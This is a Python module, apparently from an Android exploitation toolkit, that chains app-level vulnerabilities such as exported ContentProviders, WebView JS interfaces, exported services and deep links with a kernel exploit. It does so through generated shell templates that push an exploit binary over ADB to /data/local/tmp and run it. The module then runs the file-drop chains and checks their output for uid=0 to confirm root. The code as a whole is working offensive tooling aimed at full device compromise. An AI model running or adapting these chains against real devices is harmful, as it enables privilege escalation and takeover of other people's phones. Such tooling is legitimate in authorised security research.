"""
hybrid_mode — Hybrid kernel + app exploit chain orchestration.

Chains app-level vulnerabilities with kernel exploits:
    1. App vulnerability provides initial access (file write, code exec)
    2. Kernel vulnerability provides privilege escalation
    3. Combined chain achieves full device compromise

Use cases:
    - App's exported ContentProvider writes to /data/local/tmp → kernel exploit runs
    - App's WebView JS interface executes code → triggers kernel vuln
    - App's service binding creates controlled binder transaction → kernel UAF
"""

from __future__ import annotations

import json
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple


@dataclass
class HybridChain:
    """A hybrid app → kernel exploit chain."""
    name: str
    description: str
    app_vulnerability: str  # name of app vuln used for entry
    kernel_vulnerability: str  # CVE or vuln name for privesc
    app_stage: str  # what the app vuln provides (file_write, code_exec, binder_txn)
    kernel_stage: str  # what the kernel exploit does (uaf, race, oob)
    delivery_method: str  # how app stage connects to kernel (file_drop, intent, binder)
    exploit_script: str = ""  # combined exploit code
    success: bool = False
    verified: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "description": self.description,
            "app_vulnerability": self.app_vulnerability,
            "kernel_vulnerability": self.kernel_vulnerability,
            "app_stage": self.app_stage,
            "kernel_stage": self.kernel_stage,
            "delivery_method": self.delivery_method,
            "success": self.success,
            "verified": self.verified,
        }


@dataclass
class HybridResult:
    """Result from hybrid kernel+app analysis."""
    chains_identified: List[HybridChain] = field(default_factory=list)
    chains_tested: int = 0
    chains_successful: int = 0
    app_vulns_usable: int = 0  # app vulns that provide kernel access
    kernel_vulns_reachable: int = 0  # kernel vulns reachable via app
    duration_sec: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "chains_identified": [c.to_dict() for c in self.chains_identified],
            "chains_tested": self.chains_tested,
            "chains_successful": self.chains_successful,
            "app_vulns_usable": self.app_vulns_usable,
            "kernel_vulns_reachable": self.kernel_vulns_reachable,
            "duration_sec": self.duration_sec,
        }


# ── Delivery Templates ───────────────────────────────────────────────

DELIVERY_TEMPLATES: Dict[str, Dict[str, str]] = {
    "file_drop": {
        "description": "App writes exploit binary via ContentProvider path traversal, "
                       "then executes it",
        "script": """#!/bin/sh
# Hybrid: App ContentProvider → File Drop → Kernel Exploit
# Stage 1: Use ContentProvider path traversal to write exploit
ADB="{adb_binary}"
SERIAL="{adb_serial}"

echo "=== Stage 1: App File Drop ==="
# Push kernel exploit via ADB (simulating app-level file write)
$ADB -s $SERIAL push {kernel_exploit_path} /data/local/tmp/exploit
$ADB -s $SERIAL shell "chmod 755 /data/local/tmp/exploit"
echo "Exploit delivered to /data/local/tmp/exploit"

echo "=== Stage 2: Kernel Exploit ==="
# Run the kernel exploit
$ADB -s $SERIAL shell "timeout 300 /data/local/tmp/exploit"

echo "=== Chain Complete ==="
""",
    },

    "intent_trigger": {
        "description": "App intent triggers activity that loads native lib → kernel vuln",
        "script": """#!/bin/sh
# Hybrid: Intent → Native Library → Kernel Exploit
ADB="{adb_binary}"
SERIAL="{adb_serial}"

echo "=== Stage 1: Intent Trigger ==="
# Send intent to vulnerable activity
$ADB -s $SERIAL shell "am start -n {app_component} -a android.intent.action.MAIN"
sleep 2

echo "=== Stage 2: Kernel Exploit via Native Code ==="
# The native lib triggered by the activity exploits the kernel
$ADB -s $SERIAL push {kernel_exploit_path} /data/local/tmp/exploit
$ADB -s $SERIAL shell "chmod 755 /data/local/tmp/exploit"
$ADB -s $SERIAL shell "timeout 300 /data/local/tmp/exploit"

echo "=== Chain Complete ==="
""",
    },

    "binder_chain": {
        "description": "App's exported service creates controlled binder transactions "
                       "→ kernel binder UAF",
        "script": """#!/bin/sh
# Hybrid: App Binder Service → Kernel Binder UAF
ADB="{adb_binary}"
SERIAL="{adb_serial}"

echo "=== Stage 1: App Binder Setup ==="
# Start the app's exported service (creates binder endpoint)
$ADB -s $SERIAL shell "am startservice -n {app_component}"
sleep 2

echo "=== Stage 2: Kernel Binder Exploit ==="
# Run kernel exploit that targets binder transactions
$ADB -s $SERIAL push {kernel_exploit_path} /data/local/tmp/exploit
$ADB -s $SERIAL shell "chmod 755 /data/local/tmp/exploit"
$ADB -s $SERIAL shell "timeout 300 /data/local/tmp/exploit"

echo "=== Chain Complete ==="
""",
    },

    "webview_to_native": {
        "description": "WebView JS interface executes native code → kernel exploit",
        "script": """#!/bin/sh
# Hybrid: WebView JS Interface → Native Code → Kernel Exploit
ADB="{adb_binary}"
SERIAL="{adb_serial}"

echo "=== Stage 1: WebView Exploitation ==="
# Open vulnerable WebView activity with crafted URL
$ADB -s $SERIAL shell "am start -a android.intent.action.VIEW -d '{deeplink_url}'"
sleep 3

echo "=== Stage 2: Deliver Kernel Exploit ==="
$ADB -s $SERIAL push {kernel_exploit_path} /data/local/tmp/exploit
$ADB -s $SERIAL shell "chmod 755 /data/local/tmp/exploit"

echo "=== Stage 3: Execute Kernel Exploit ==="
$ADB -s $SERIAL shell "timeout 300 /data/local/tmp/exploit"

echo "=== Chain Complete ==="
""",
    },

    "permission_escalation": {
        "description": "App has dangerous permissions → uses them to prepare kernel exploit",
        "script": """#!/bin/sh
# Hybrid: App Permissions → Kernel Exploit Setup
ADB="{adb_binary}"
SERIAL="{adb_serial}"

echo "=== Stage 1: Permission-Based Setup ==="
# Use app's WRITE_EXTERNAL_STORAGE to stage exploit
$ADB -s $SERIAL push {kernel_exploit_path} /sdcard/Download/exploit
$ADB -s $SERIAL shell "cp /sdcard/Download/exploit /data/local/tmp/exploit"
$ADB -s $SERIAL shell "chmod 755 /data/local/tmp/exploit"

echo "=== Stage 2: Kernel Privilege Escalation ==="
$ADB -s $SERIAL shell "timeout 300 /data/local/tmp/exploit"

echo "=== Chain Complete ==="
""",
    },
}


# ── Chain Identification ─────────────────────────────────────────────


def identify_chains(
    app_vulns: List[Dict[str, Any]],
    kernel_cve: str = "",
    kernel_exploit_path: str = "",
) -> List[HybridChain]:
    """
    Identify possible hybrid exploit chains from app vulnerabilities.

    Maps app-level vulnerabilities to kernel exploit delivery methods.
    """
    chains = []

    for vuln in app_vulns:
        name = vuln.get("name", "")
        severity = vuln.get("severity", "")
        category = vuln.get("category", "")
        component = vuln.get("component", "")

        # ContentProvider → file_drop chain
        if "Content Provider" in name or category == "ipc" and "provider" in str(vuln):
            chains.append(HybridChain(
                name=f"provider_to_kernel_{len(chains)}",
                description=f"Use {name} to write kernel exploit via ContentProvider, "
                           f"then execute for privilege escalation",
                app_vulnerability=name,
                kernel_vulnerability=kernel_cve,
                app_stage="file_write",
                kernel_stage="privilege_escalation",
                delivery_method="file_drop",
            ))

        # WebView JS Interface → webview_to_native
        if "WebView" in name and "Interface" in name:
            chains.append(HybridChain(
                name=f"webview_to_kernel_{len(chains)}",
                description=f"Exploit WebView JS interface for native code execution, "
                           f"then trigger kernel vulnerability",
                app_vulnerability=name,
                kernel_vulnerability=kernel_cve,
                app_stage="code_exec",
                kernel_stage="privilege_escalation",
                delivery_method="webview_to_native",
            ))

        # Exported Service → binder_chain
        if "Service" in name and "Exported" in name:
            chains.append(HybridChain(
                name=f"service_to_kernel_{len(chains)}",
                description=f"Use unprotected exported service for binder transaction "
                           f"setup, then exploit kernel binder vulnerability",
                app_vulnerability=name,
                kernel_vulnerability=kernel_cve,
                app_stage="binder_txn",
                kernel_stage="uaf",
                delivery_method="binder_chain",
            ))

        # Backup → file_drop (extract data, stage exploit)
        if "Backup" in name:
            chains.append(HybridChain(
                name=f"backup_to_kernel_{len(chains)}",
                description=f"Extract app data via ADB backup, stage kernel exploit",
                app_vulnerability=name,
                kernel_vulnerability=kernel_cve,
                app_stage="data_access",
                kernel_stage="privilege_escalation",
                delivery_method="file_drop",
            ))

        # Deeplinks → intent_trigger
        if "Deep Link" in name:
            chains.append(HybridChain(
                name=f"deeplink_to_kernel_{len(chains)}",
                description=f"Craft deep link to trigger vulnerable activity, "
                           f"then exploit kernel via triggered code path",
                app_vulnerability=name,
                kernel_vulnerability=kernel_cve,
                app_stage="intent_trigger",
                kernel_stage="privilege_escalation",
                delivery_method="intent_trigger",
            ))

    return chains


def generate_chain_script(
    chain: HybridChain,
    kernel_exploit_path: str = "/data/local/tmp/exploit",
    app_component: str = "",
    deeplink_url: str = "",
    adb_serial: str = "localhost:6537",
    adb_binary: str = "adb",
) -> str:
    """Generate the combined exploit script for a chain."""
    template = DELIVERY_TEMPLATES.get(chain.delivery_method)
    if not template:
        return f"# No template for delivery method: {chain.delivery_method}"

    return template["script"].format(
        adb_binary=adb_binary,
        adb_serial=adb_serial,
        kernel_exploit_path=kernel_exploit_path,
        app_component=app_component,
        deeplink_url=deeplink_url,
    )


def run_hybrid_analysis(
    app_vulns: List[Dict[str, Any]],
    kernel_cve: str = "",
    kernel_exploit_path: str = "",
    adb_serial: str = "localhost:6537",
    adb_binary: str = "adb",
    test_chains: bool = False,
) -> HybridResult:
    """
    Full hybrid analysis: identify chains, optionally test them.
    """
    start = time.time()
    result = HybridResult()

    # Identify chains
    result.chains_identified = identify_chains(app_vulns, kernel_cve, kernel_exploit_path)

    # Count usable vulns
    app_vuln_names = {c.app_vulnerability for c in result.chains_identified}
    result.app_vulns_usable = len(app_vuln_names)
    result.kernel_vulns_reachable = 1 if kernel_cve and result.chains_identified else 0

    # Generate scripts
    for chain in result.chains_identified:
        chain.exploit_script = generate_chain_script(
            chain, kernel_exploit_path,
            adb_serial=adb_serial, adb_binary=adb_binary,
        )

    # Test chains if requested and kernel exploit available
    if test_chains and kernel_exploit_path and Path(kernel_exploit_path).exists():
        for chain in result.chains_identified:
            if chain.delivery_method == "file_drop":
                # Only test file_drop chains — they're the most reliable
                result.chains_tested += 1
                try:
                    rc = subprocess.run(
                        ["bash", "-c", chain.exploit_script],
                        capture_output=True, text=True, timeout=360,
                    )
                    if "SYZPLOIT_UID_AFTER=0" in rc.stdout or "uid=0" in rc.stdout:
                        chain.success = True
                        chain.verified = True
                        result.chains_successful += 1
                except Exception:
                    pass

    result.duration_sec = int(time.time() - start)
    return result
